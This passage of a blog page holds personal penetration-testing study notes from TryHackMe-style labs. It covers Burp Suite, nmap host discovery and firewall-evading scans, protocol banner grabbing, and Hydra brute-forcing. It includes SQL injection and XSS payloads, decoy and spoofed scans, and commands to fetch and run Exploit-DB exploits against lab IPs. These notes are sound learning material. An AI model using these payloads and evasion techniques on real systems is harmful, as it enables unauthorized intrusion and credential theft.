  <li><code class="language-plaintext highlighter-rouge">admin123' UNION SELECT SLEEP(5);--</code> No sleep, just return.</li>
  <li><code class="language-plaintext highlighter-rouge">admin123' UNION SELECT SLEEP(5),2;--</code> Sleep for 5 sconds.</li>
</ul>

<p>Out-of-Band SQLi:</p>
<ul>
  <li>attack channel could be a web request</li>
  <li>data gathering channel could be monitoring HTTP/DNS requests made to a service you control.</li>
</ul>

<p>Remediation：</p>
<ul>
  <li>Prepared Statements (With Parameterized Queries)</li>
  <li>Input Validation</li>
  <li>Escaping User Input</li>
</ul>

<h2 id="burp-suite-basic"><span class="mr-2">Burp Suite Basic</span><a href="#burp-suite-basic" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
<p><strong>Extensions</strong></p>
<ul>
  <li>java, jython, jRuby</li>
  <li>https://www.jython.org/</li>
  <li>https://www.jruby.org/</li>
  <li>Burp Suite Extender module: load extension, providing a marketplace.</li>
</ul>

<p><strong>Proxy</strong></p>
<ul>
  <li>https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-basic/</li>
  <li>Intercept server response. <code class="language-plaintext highlighter-rouge">Or</code> <code class="language-plaintext highlighter-rouge">Request</code> <code class="language-plaintext highlighter-rouge">Was Intercepted</code></li>
</ul>

<p><strong>embeded browser</strong></p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">Project options -&gt; Misc -&gt; Embedded Browser</code> and check the <code class="language-plaintext highlighter-rouge">Allow the embedded browser to run without a sandbox</code></li>
  <li>create a new user and run Burp Suite under a low privilege account.(security, recomanded)</li>
</ul>

<p><strong>scope</strong></p>
<ul>
  <li>after set scope, we need: Proxy Options sub-tab and select <code class="language-plaintext highlighter-rouge">And</code> <code class="language-plaintext highlighter-rouge">URL</code> <code class="language-plaintext highlighter-rouge">Is in target scope</code></li>
</ul>

<p><strong>Post modified request</strong></p>
<ul>
  <li>URL encode: ctrl+U
POST /ticket/ HTTP/1.1
Host: 10.10.117.83
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Origin: http://10.10.117.83
Connection: close
Referer: http://10.10.117.83/ticket/
Upgrade-Insecure-Requests: 1</li>
</ul>

<p>email=<scripttt>alert("Succ3ssful%2bXSS")</scripttt>&amp;content=hack+test</p>
<ul>
  <li>“%2b” -&gt; “+”</li>
</ul>

<h2 id="brup-suite-repeater"><span class="mr-2">Brup Suite: Repeater</span><a href="#brup-suite-repeater" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
<ul>
  <li>Another way: by hand, curl, https://curl.se/</li>
  <li>0x0d -－”/r”</li>
  <li>0x0a -－”/n”</li>
  <li>each line of response ends with “/r/n”, same as “0d0a”.</li>
</ul>

<p><strong>SQLi with repeater</strong></p>
<ul>
  <li>query <code class="language-plaintext highlighter-rouge">http://10.10.39.188/about/2'</code> with a <code class="language-plaintext highlighter-rouge">'</code> behind.</li>
  <li>Invalid statement: <code class="language-plaintext highlighter-rouge">SELECT firstName, lastName, pfpLink, role, bio FROM people WHERE id = 2'&lt;/code&gt;</code></li>
  <li>The INFORMATION_SCHEMA Database: “This is the database about databases. It’s used to store details of other databases on the server”.</li>
  <li><code class="language-plaintext highlighter-rouge">/about/0 UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name="people"</code></li>
  <li>this requey can only retrieve one column_nmae of the people table.</li>
  <li>MySQL GROUP_CONCAT() function returns a string with concatenated non-NULL value from a group.</li>
  <li>Notice that we also changed the ID that we are selecting from 2 to 0. By setting the ID to an invalid number, we  ensure that we don’t retrieve anything with the original (legitimate) query; this means that the first row returned from the database will be our desired response from the injected query.</li>
  <li><code class="language-plaintext highlighter-rouge">/about/0 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name="people"</code></li>
  <li>retrieve all columns name of people table.</li>
</ul>

<h2 id="burpsuite-intruder"><span class="mr-2">burpsuite intruder</span><a href="#burpsuite-intruder" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
<ul>
  <li>Intruder is Burp Suite’s in-built fuzzing tool.</li>
  <li>similar to Wfuzz or Ffuf.</li>
</ul>

<p><strong>4 attacks:</strong></p>
<ul>
  <li>sniper attack: pos1, pos2, 3 word a b c. Try: pos1,a; pos1,b; pos1,c;   a,pos2; b,pos2; c,pos2. One wordlist set.</li>
  <li>Battering ram attack: puts the same payload in every position rather than in each position in turn. One wordlist set.</li>
  <li>Pitchfork attack: uses one payload set per position. iterates through them all at once. Word lists should be identical length.</li>
  <li>Cluster bomb attack: iterates through each payload set individually, making sure that every possible combination is tested.</li>
</ul>

<p><strong>CSRF Token bypass:</strong></p>
<ul>
  <li>a session cookie set in the response, as well as a CSRF (Cross-Site Request Forgery) token included in the form as a hidden field. If we refresh the page, we should see that both of these change with each request: this means that we will need to extract valid values for both every time we make a request.</li>
  <li>Run macro to “Get” the session every time before intruder.</li>
  <li>update current request with parameters matched from final macro response. (this case, the “session” parameter.)</li>
  <li>Update current request with cookies from session handling cookie jar.</li>
  <li>ref: https://portswigger.net/burp/documentation/desktop/options/sessions</li>
  <li>csrf token: https://portswigger.net/web-security/csrf/tokens</li>
</ul>

<h2 id="burp-suite-other-modules"><span class="mr-2">Burp Suite: Other Modules</span><a href="#burp-suite-other-modules" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
<p><strong>Decoder</strong></p>
<ul>
  <li>https://gchq.github.io/CyberChef/</li>
</ul>

<p><strong>Sequencer</strong></p>
<ul>
  <li>the effective entropy.</li>
</ul>

<h2 id="burp-suite-extender"><span class="mr-2">Burp Suite: Extender</span><a href="#burp-suite-extender" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
<ul>
  <li>Burp Suite “BApp” store.</li>
  <li>all traffic passing through Burp Suite will be passed through each extension in order, starting at the top of the list and working down.</li>
  <li>https://github.com/portswigger/request-timer</li>
  <li><img width="474" alt="image" data-src="https://user-images.githubusercontent.com/91292763/147384694-64caa155-123c-495b-a734-917290d13658.png" data-proofer-ignore></li>
  <li>Jython. https://www.jython.org/download. significantly increases the number of extensions available to us.</li>
  <li>Jruby. https://www.jruby.org/download.</li>
</ul>

<p><strong>Write extender:</strong></p>
<ul>
  <li>https://portswigger.net/burp/extender/writing-your-first-burp-suite-extension</li>
</ul>

<h2 id="passive-reconnaissance"><span class="mr-2">Passive Reconnaissance</span><a href="#passive-reconnaissance" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
<p><strong>The Unified Kill Chain</strong></p>
<ul>
  <li>https://www.unifiedkillchain.com/</li>
</ul>

<p><strong>whois</strong></p>
<ul>
  <li>https://www.ietf.org/rfc/rfc3912.txt</li>
</ul>

<h2 id="nmap-live-host-discovery"><span class="mr-2">Nmap Live Host Discovery</span><a href="#nmap-live-host-discovery" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>

<p><strong>nslookup and dig</strong></p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">nslookup tryhackme.com</code></li>
  <li><code class="language-plaintext highlighter-rouge">nslookup -type=A tryhackme.com 1.1.1.1</code> find ipv4 in 1.1.1.1</li>
  <li><code class="language-plaintext highlighter-rouge">dig tryhackme.com MX</code></li>
  <li><code class="language-plaintext highlighter-rouge">dig @1.1.1.1 tryhackme.com MX</code></li>
  <li><code class="language-plaintext highlighter-rouge">dig thmlabs.com txt</code></li>
</ul>

<p>DNS records can find more information, like subdomain, especially which not updated regularly.
<strong>dnsdumpster</strong></p>
<ul>
  <li>https://dnsdumpster.com/</li>
</ul>

<p><strong>Shodan.io</strong></p>
<ul>
  <li>https://help.shodan.io/the-basics/search-query-fundamentals</li>
  <li>https://tryhackme.com/room/shodan</li>
</ul>

<h2 id="active-reconnaissance"><span class="mr-2">Active Reconnaissance</span><a href="#active-reconnaissance" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
<p><strong>web browser</strong></p>
<ul>
  <li>FoxyProxy(add-one):https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/</li>
  <li>User-Agent Switcher and Manager: https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher/</li>
  <li>Wappalyzer https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/</li>
  <li>ctrl+shift+I: sources -&gt; script.js</li>
</ul>

<p><strong>ping</strong>
count (2 are same)</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">ping -n 10 10.10.117.50</code> on MS Windows system.</li>
  <li><code class="language-plaintext highlighter-rouge">ping -c 10 10.10.117.50</code> on Linux or Mac OS.</li>
</ul>

<p><strong>Traceroute</strong></p>
<ul>
  <li>when TTL reaches 0, an ICMP Time-to-Live exceeded would be sent to the original sender.</li>
  <li>On linux, traceroute is send in UDP datagrams.</li>
</ul>

<p><strong>Telnet</strong></p>
<ul>
  <li>use Telnet to connect to any service and grab its banner.(not it designed for.)</li>
  <li><code class="language-plaintext highlighter-rouge">telnet 10.10.117.50 80</code> then <code class="language-plaintext highlighter-rouge">GET / HTTP/1.1</code></li>
  <li>get the service information.</li>
</ul>

<p><strong>Netcat</strong>
GET</p>
<ul>
  <li>Netcat supports both TCP and UDP protocols.</li>
  <li><code class="language-plaintext highlighter-rouge">nc 10.10.108.61 PORT</code> <code class="language-plaintext highlighter-rouge">hostname:abc</code> then, SHIFT+ENTER</li>
</ul>

<p>Open port and listen</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">nc -vnlp 1234</code></li>
  <li>-l	Listen mode</li>
  <li>-p	Specify the Port number</li>
  <li>-n	Numeric only; no resolution of hostnames via DNS</li>
  <li>-v	Verbose output (optional, yet useful to discover any bugs)</li>
  <li>-vv	Very Verbose (optional)</li>
  <li>-k	Keep listening after client disconnects</li>
</ul>

<p><strong>Nmap</strong>
<img data-src="https://user-images.githubusercontent.com/91292763/147562879-93e285b4-8fea-4f67-b273-d2e39eb7ffd1.png" alt="image" data-proofer-ignore></p>

<p>use list</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">nmap -iL list_of_hosts.txt</code> -iL: input filename.</li>
</ul>

<p>ARP</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">nmap -PR -sn 192.168.0.1/24</code> -PR: indicates that you only want an ARP scan. -sn: No port scan.</li>
</ul>

<p>ICMP</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">nmap -PE -sn 192.168.0.1/24</code> -PE: ICMP.</li>
  <li>Nmap didn’t need to send ICMP packets as it confirmed that these hosts are up based on the ARP responses it received.</li>
  <li>if in same subnet, we can see the MAC address.</li>
</ul>

<p>TCP SYN</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">sudo nmap -PS -sn 192.168.1.1/24</code> -PS:  TCP SYN ping.</li>
  <li>Normal syn ping do not need root user.</li>
  <li>Privileged users (root and sudoers) can send TCP SYN packets and don’t need to complete the TCP 3-way handshake even if the port is open. Will send RST instead. Can <strong>avoid some firewall rules</strong>.</li>
  <li><code class="language-plaintext highlighter-rouge">-PS21</code> target on port 21.</li>
  <li><code class="language-plaintext highlighter-rouge">-PS21-25</code> 21 to 25.</li>
</ul>

<p>TCP ACK</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">sudo nmap -PA -sn MACHINE_IP/24</code></li>
  <li>need root.</li>
</ul>

<p>UDP</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">sudo nmap -PU -sn 10.10.68.220/24</code></li>
</ul>

<p><strong>Reverse-DNS Lookup</strong></p>
<ul>
  <li>Nmap’s default behaviour is to use reverse-DNS online hosts.</li>
  <li>-n to skip this step.</li>
  <li>-R to query the DNS server even for offline hosts</li>
</ul>

<h2 id="nmap-basic-port-scans"><span class="mr-2">Nmap Basic Port Scans</span><a href="#nmap-basic-port-scans" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
<p>Port States:</p>
<ol>
  <li>Open</li>
  <li>Closed</li>
  <li>Filtered</li>
  <li>Unfiltered</li>
  <li>
    <div class="table-wrapper"><table>
      <tbody>
        <tr>
          <td>Open</td>
          <td>Filtered</td>
        </tr>
      </tbody>
    </table></div>
  </li>
  <li>
    <div class="table-wrapper"><table>
      <tbody>
        <tr>
          <td>Closed</td>
          <td>Filtered</td>
        </tr>
      </tbody>
    </table></div>
  </li>
</ol>

<p><strong>TCP header</strong></p>
<ul>
  <li>https://datatracker.ietf.org/doc/html/rfc793.html</li>
  <li><img data-src="https://user-images.githubusercontent.com/91292763/147625615-9c0835f0-f8cb-4b0b-8db1-110eb867ebb1.png" alt="image" data-proofer-ignore></li>
  <li>URG flag: set is processed immediately without consideration of having to wait on previously sent TCP segments.</li>
  <li>Push flag： asking TCP to pass the data to the application promptly.</li>
</ul>

<p><strong>TCP Scan</strong></p>
<ul>
  <li>TCP connect scan. <code class="language-plaintext highlighter-rouge">nmap -sT {target}</code>  full 3-way handshake, then RST. Only possible TCP port scan if not root.</li>
  <li>TCP SYN scan. <code class="language-plaintext highlighter-rouge">nmap -sS {target}</code> need root.</li>
</ul>

<p><strong>UDP Scan</strong></p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">nmap -sU {target}</code> Open: no response. Closed: ICMP destination unreachable.</li>
</ul>

<p><strong>Scope and performance</strong></p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">-F</code> most common 100 ports</li>
  <li><code class="language-plaintext highlighter-rouge">-T0</code> scans one port at a time and waits 5 minutes</li>
  <li><code class="language-plaintext highlighter-rouge">-T5</code> is the most aggressive in terms of speed</li>
  <li><code class="language-plaintext highlighter-rouge">-T4</code> is often used during CTFs</li>
  <li><code class="language-plaintext highlighter-rouge">--max-rate 10</code> or <code class="language-plaintext highlighter-rouge">--max-rate=10</code> ensures that your scanner is not sending more than ten packets per second.</li>
  <li><code class="language-plaintext highlighter-rouge">--min-parallelism=512</code> pushes Nmap to maintain at least 512 probes in parallel</li>
  <li><code class="language-plaintext highlighter-rouge">-p-</code> all ports.</li>
</ul>

<h2 id="nmap-advanced-port-scans"><span class="mr-2">Nmap Advanced Port Scans</span><a href="#nmap-advanced-port-scans" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>

<p>Null Scan</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">sudo nmap -sN 10.10.22.67</code>, all six flag bits are set to zero.</li>
  <li>
    <div class="table-wrapper"><table>
      <tbody>
        <tr>
          <td>closed: RST,ACK. open</td>
          <td>filtered: no reply.</td>
        </tr>
      </tbody>
    </table></div>
  </li>
  <li>need root.</li>
</ul>

<p>FIN Scan</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">sudo nmap -sF 10.10.22.67</code>, FIN flag set.</li>
  <li>
    <div class="table-wrapper"><table>
      <tbody>
        <tr>
          <td>closed: RST,ACK. open</td>
          <td>filtered: no reply.</td>
        </tr>
      </tbody>
    </table></div>
  </li>
</ul>

<p>Xmas Scan</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">sudo nmap -sX 10.10.22.67</code>, FIN, PSH, and URG flags set.</li>
  <li>
    <div class="table-wrapper"><table>
      <tbody>
        <tr>
          <td>closed: RST,ACK. open</td>
          <td>filtered: no reply.</td>
        </tr>
      </tbody>
    </table></div>
  </li>
</ul>

<p>Why:</p>
<ul>
  <li>A stateless firewall will check if the incoming packet has the SYN flag set to detect a connection attempt.</li>
  <li>Using a flag combination that does not match the SYN packet makes it possible to deceive the firewall and reach the system behind it.</li>
  <li>However, a stateful firewall will practically block all such crafted packets and render this kind of scan useless.</li>
</ul>

<p>TCP Maimon Scan:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">sudo nmap -sM 10.10.22.67</code>, FIN and ACK bits are set.</li>
  <li>no much use, open and close reply almost same.</li>
</ul>

<p>TCP ACK Scan:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">sudo nmap -sA 10.10.22.67</code>, ACK flag set.</li>
  <li>can not find if port is open.</li>
  <li>this type of scan is more suitable to discover firewall rule sets and configuration.</li>
  <li>Result indicates that the firewall is blocking all other ports except for these three ports.</li>
</ul>

<p>Window Scan:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">sudo nmap -sW 10.10.22.67</code>, like ACK scan, with more examines the TCP Window field of the RST packets returned.</li>
  <li>TCP window scan pointed that three ports are detected as closed.</li>
  <li>Although we know that these three ports are closed, we realize they responded differently, indicating that the firewall does not block them.</li>
  <li>ACK and window scans are exposing the firewall rules, not the services.</li>
</ul>

<p>Custom Scan:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">sudo nmap --scanflags RSTSYNFIN {target}</code></li>
</ul>

<p><strong>Spoofing and Decoys</strong></p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">nmap -S {SPOOFED_IP} 10.10.121.57</code></li>
  <li><code class="language-plaintext highlighter-rouge">--spoof-mac SPOOFED_MAC</code> This address spoofing is only possible if the attacker and the target machine are on the same Ethernet (802.3) network or same WiFi (802.11).</li>
  <li><code class="language-plaintext highlighter-rouge">nmap -D 10.10.0.1,10.10.0.2,RND,RND,ME 10.10.121.57</code> decoy, hide among other IPs. RND, random IP.</li>
</ul>

<p><strong>Fragmented Packets</strong></p>
<ul>
  <li>A traditional firewall inspects, at least, the IP header and the transport layer header.</li>
  <li>A more sophisticated firewall would also try to examine the data carried by the transport layer.</li>
  <li><code class="language-plaintext highlighter-rouge">sudo nmap -sS -p80 -f 10.20.30.144</code> 8 bytes after IP header, in each packet.</li>
  <li><code class="language-plaintext highlighter-rouge">sudo nmap -sS -p80 -ff 10.20.30.144</code> 16 bytes after IP header, in each packet.</li>
  <li>Nmap splits the packets into eight bytes or less after the IP header. So a 20-byte TCP header would be split into three packets.</li>
  <li>The idea is to split up the TCP header over several packets to make it harder for packet filters, intrusion detection systems, and other annoyances to detect.</li>
</ul>

<p><strong>Idle/Zombie Scan</strong></p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">nmap -sI ZOMBIE_IP 10.10.121.57</code></li>
  <li>This is accomplished by checking the IP identification (IP ID) value in the IP header.</li>
</ul>

<p><strong>More Details</strong></p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">sudo nmap -sS --reason 10.10.252.27</code> get .</li>
  <li><code class="language-plaintext highlighter-rouge">-v</code> for verbose output or <code class="language-plaintext highlighter-rouge">-vv</code> for even more verbosity.</li>
  <li><code class="language-plaintext highlighter-rouge">-d</code> for debugging details or <code class="language-plaintext highlighter-rouge">-dd</code> for even more details.</li>
</ul>

<h2 id="nmap-post-port-scans"><span class="mr-2">Nmap Post Port Scans</span><a href="#nmap-post-port-scans" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
<p><strong>OS Detection and Traceroute</strong></p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">sudo nmap -sV 10.10.129.53</code> Version detection.</li>
  <li><code class="language-plaintext highlighter-rouge">sudo nmap -sS -O 10.10.129.53</code> OS detection.</li>
  <li><code class="language-plaintext highlighter-rouge">nmap -sS --traceroute 10.10.129.53</code> traceroute, Standard traceroute starts with a packet of low TTL (Time to Live) and keeps increasing until it reaches the target. Nmap’s traceroute starts with a packet of high TTL and keeps decreasing it.</li>
</ul>

<p><strong>Nmap Scripting Engine (NSE)</strong></p>
<ul>
  <li>Lua language.</li>
  <li>path: /usr/share/nmap/scripts</li>
  <li><code class="language-plaintext highlighter-rouge">-sC</code> Default scripts</li>
</ul>

<p>Script Category	Description</p>
<ul>
  <li>auth	Authentication related scripts</li>
  <li>broadcast	Discover hosts by sending broadcast messages</li>
  <li>brute	Performs brute-force password auditing against logins</li>
  <li>default	Default scripts, same as -sC</li>
  <li>discovery	Retrieve accessible information, such as database tables and DNS names</li>
  <li>dos	Detects servers vulnerable to Denial of Service (DoS)</li>
  <li>exploit	Attempts to exploit various vulnerable services</li>
  <li>external	Checks using a third-party service, such as Geoplugin and Virustotal</li>
  <li>fuzzer	Launch fuzzing attacks</li>
  <li>intrusive	Intrusive scripts such as brute-force attacks and exploitation</li>
  <li>malware	Scans for backdoors</li>
  <li>safe	Safe scripts that won’t crash the target</li>
  <li>version	Retrieve service versions</li>
  <li>vuln	Checks for vulnerabilities or exploit vulnerable services</li>
</ul>

<p>http-date</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">sudo nmap -sS -n --script "http-date" 10.10.16.134</code></li>
</ul>

<p>find a certain script</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">/usr/share/nmap/scripts# find -name '*cve2015-1635*'</code></li>
  <li>with ‘cve2015-1635’ in the middle of the file name.</li>
</ul>

<p><strong>Saving the Output</strong>
Normal</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">-oN FILENAME</code>, N stands for normal
Grepable</li>
  <li><code class="language-plaintext highlighter-rouge">-oG FILENAME</code>
XML</li>
  <li><code class="language-plaintext highlighter-rouge">-oX FILENAME</code></li>
</ul>

<h2 id="protocols-and-servers"><span class="mr-2">Protocols and Servers</span><a href="#protocols-and-servers" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
<p><strong>http</strong></p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">telnet 10.10.115.51 80</code></li>
  <li><code class="language-plaintext highlighter-rouge">GET /index.html HTTP/1.1</code></li>
  <li><code class="language-plaintext highlighter-rouge">host: telnet</code></li>
  <li>double ‘Enter’</li>
</ul>

<p><strong>ftp</strong>
Use telnet</p>
<ul>
  <li>File Transfer Protocol, cleartext</li>
  <li><code class="language-plaintext highlighter-rouge">telnet 10.10.115.51 21</code></li>
  <li><code class="language-plaintext highlighter-rouge">USER frank</code></li>
  <li><code class="language-plaintext highlighter-rouge">PASS D2xc9CgD</code></li>
  <li><code class="language-plaintext highlighter-rouge">STAT</code> can provide some added information</li>
  <li><code class="language-plaintext highlighter-rouge">SYST</code> command shows the System Type of the target (UNIX in this case)</li>
  <li><code class="language-plaintext highlighter-rouge">PASV</code> switches the mode to passive. Active: port 20. Passive: ports above 1023.</li>
  <li><code class="language-plaintext highlighter-rouge">TYPE A</code> switches the file transfer mode to ASCII.</li>
  <li><code class="language-plaintext highlighter-rouge">TYPE I</code> switches the file transfer mode to binary.</li>
  <li>we cannot transfer a file using a simple client such as Telnet because FTP creates a separate connection for file transfer.</li>
</ul>

<p>use ftp</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">ftp 10.10.115.51</code></li>
  <li><code class="language-plaintext highlighter-rouge">ftp&gt; ls</code></li>
  <li><code class="language-plaintext highlighter-rouge">ftp&gt; ascii</code></li>
  <li><code class="language-plaintext highlighter-rouge">ftp&gt; get README.txt</code></li>
  <li><code class="language-plaintext highlighter-rouge">ftp&gt; exit</code></li>
  <li>ftp software: vsftpd, ProFTPD, uFTP. Some web browsers also support FTP protocol.</li>
</ul>

<p><strong>SMTP</strong>
4 components:</p>
<ul>
  <li>Mail Submission Agent (MSA)</li>
  <li>Mail Transfer Agent (MTA):  (SMTP)</li>
  <li>Mail Delivery Agent (MDA):  (POP3) or (IMAP)</li>
  <li>Mail User Agent (MUA)</li>
</ul>

<p>SMTP</p>
<ul>
  <li>is used to communicate with an MTA server.</li>
  <li>default port 25.</li>
  <li><code class="language-plaintext highlighter-rouge">telnet MACHINE_IP 25</code></li>
</ul>

<p>POP3</p>
<ul>
  <li>your mail client (MUA) will connect to the POP3 server (MDA), authenticate, and download the messages.</li>
  <li>download the email messages from a Mail Delivery Agent (MDA) server</li>
  <li>default port 110</li>
  <li><code class="language-plaintext highlighter-rouge">telnet 10.10.124.6 110</code></li>
  <li><code class="language-plaintext highlighter-rouge">USER frank</code></li>
  <li><code class="language-plaintext highlighter-rouge">PASS D2xc9CgD</code></li>
  <li><code class="language-plaintext highlighter-rouge">STAT</code></li>
</ul>

<p>IMAP</p>
<ul>
  <li>Internet Message Access Protocol (IMAP)</li>
  <li>default port 143</li>
  <li>possible to keep your email synchronized across multiple devices (and mail clients), POP3 can not.</li>
  <li>changes will be saved on the IMAP server (MDA)</li>
  <li><code class="language-plaintext highlighter-rouge">telnet 10.10.124.6 143</code></li>
  <li><code class="language-plaintext highlighter-rouge">LOGIN frank D2xc9CgD</code></li>
</ul>

<h2 id="protocols-and-servers-2"><span class="mr-2">Protocols and Servers 2</span><a href="#protocols-and-servers-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>

<p><strong>VS:</strong></p>
<ul>
  <li>Confidentiality, Integrity,   Availability (CIA)</li>
  <li>Disclosure,      Alternation, Destruction (DAD)</li>
</ul>

<p><strong>Sniffing Attack</strong></p>
<ul>
  <li>Tcpdump, Wireshark, Tshark</li>
  <li><code class="language-plaintext highlighter-rouge">sudo tcpdump port 110 -A</code> checking email messages using POP3, in ASCII format.</li>
  <li>mitigation： Transport Layer Security (TLS) has been added to HTTP, FTP, SMTP, POP3, IMAP and many others.</li>
</ul>

<p><strong>Man-in-the-Middle (MITM) Attack</strong></p>
<ul>
  <li>Ettercap. https://www.ettercap-project.org/</li>
  <li>Bettercap. https://www.bettercap.org/</li>
  <li>With the help of Public Key Infrastructure (PKI) and trusted root certificates, Transport Layer Security (TLS) protects from MITM attacks.</li>
</ul>

<p>SSL, TSL are on presentation layer.</p>
<ul>
  <li>https://datatracker.ietf.org/doc/html/rfc6101</li>
</ul>

<p>ports:</p>
<ul>
  <li>HTTP	80	HTTPS	443</li>
  <li>FTP	21	FTPS	990. secured using SSL/TLS</li>
  <li>FTP   21	SFTP	22. secured using the SSH protocol, same port.</li>
  <li>SMTP	25	SMTPS	465</li>
  <li>POP3	110	POP3S	995</li>
  <li>IMAP	143	IMAPS	993</li>
  <li>DNS   DoT(DNS over TLS )</li>
  <li>TELNET 23</li>
  <li>SSH 22</li>
</ul>

<p>process:</p>
<ul>
  <li>Establish a TCP connection</li>
  <li>Establish SSL/TLS connection</li>
  <li>Send HTTP requests to the webserver</li>
</ul>

<p>SSH:</p>
<ul>
  <li>port 22.</li>
  <li><code class="language-plaintext highlighter-rouge">ssh username@10.10.202.115</code></li>
</ul>

<p>SCP:</p>
<ul>
  <li>can use SSH to transfer files using SCP (Secure Copy Protocol) based on the SSH protocol</li>
  <li><code class="language-plaintext highlighter-rouge">scp mark@10.10.202.115:/home/mark/archive.tar.gz ~</code> remote to local</li>
  <li><code class="language-plaintext highlighter-rouge">scp backup.tar.bz2 mark@10.10.202.115:/home/mark/</code> local to remote</li>
</ul>

<p><strong>Password Attack</strong></p>
<ul>
  <li>Hydra. https://github.com/vanhauser-thc/thc-hydra</li>
  <li><code class="language-plaintext highlighter-rouge">hydra -l username -P wordlist.txt server service</code></li>
  <li>server: the hostname or IP address of the target server.</li>
  <li>service: the service which you are trying to launch the dictionary attack.</li>
  <li><code class="language-plaintext highlighter-rouge">-s PORT</code> Use in case of non-default service port number</li>
  <li><code class="language-plaintext highlighter-rouge">-d</code> Display debugging output if the verbose output is not helping</li>
  <li><code class="language-plaintext highlighter-rouge">-V</code> or <code class="language-plaintext highlighter-rouge">-vV</code> Show the username and password combinations being tried</li>
</ul>

<h2 id="vulnerabilities-101"><span class="mr-2">Vulnerabilities 101</span><a href="#vulnerabilities-101" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
<p><strong>types</strong></p>
<ul>
  <li>Operating System</li>
  <li>(Mis)Configuration-based</li>
  <li>Weak or Default Credentials</li>
  <li>Application Logic</li>
  <li>Human-Factor</li>
</ul>

<p><strong>Scoring Vulnerabilities</strong>
CVSS</p>
<ul>
  <li>https://www.kennasecurity.com/resources/prioritization-to-prediction-report/</li>
  <li>CVSS, https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator</li>
  <li>open source, VPR not.</li>
  <li>start in 2005.</li>
</ul>

<p>VPR</p>
<ul>
  <li>Vulnerability Priority Rating.</li>
  <li>takes into account the relevancy of a vulnerability, while CVSS does not.</li>
</ul>

<p><strong>Vulnerability Databases</strong>
NVD</p>
<ul>
  <li>NVD (National Vulnerability Database) https://nvd.nist.gov/vuln/full-listing</li>
  <li>“Common Vulnerabilities and Exposures” (Or CVE for short)</li>
  <li>wanna cry: CVE-2017-0144</li>
</ul>

<p>Exploit-DB</p>
<ul>
  <li>https://www.exploit-db.com/</li>
</ul>

<h2 id="exploit-vulnerabilities"><span class="mr-2">Exploit Vulnerabilities</span><a href="#exploit-vulnerabilities" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>

<p><strong>Automated Vs. Manual Vulnerability Research</strong></p>
<ul>
  <li>nessus. https://www.tenable.com/products/nessus</li>
</ul>

<p>Vulnerability types:</p>
<ul>
  <li>Security Misconfigurations</li>
  <li>Broken Access Control</li>
  <li>Insecure Deserialization</li>
  <li>Injection</li>
</ul>

<p><strong>Finding Manual Exploits</strong></p>
<ul>
  <li>Rapid7, https://www.rapid7.com/db/</li>
  <li>GitHub, search GitHub by keywords such as “PoC”, “vulnerability”</li>
  <li>Searchsploit, offline copy of Exploit-DB</li>
  <li><code class="language-plaintext highlighter-rouge">searchsploit online book store</code> search the service “online book store”</li>
  <li><code class="language-plaintext highlighter-rouge">searchsploit -m php/webapps/47887.py</code> copy the exploit</li>
  <li><code class="language-plaintext highlighter-rouge">python 47887.py http://10.10.18.54</code> run the exploit</li>
</ul>

<h2 id="metasploit-introduction"><span class="mr-2">Metasploit: Introduction</span><a href="#metasploit-introduction" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>

<p><strong>main components</strong></p>
<ul>
  <li>msfconsole: The main command-line interface.</li>
  <li>Modules: supporting modules such as exploits, scanners, payloads, etc.</li>
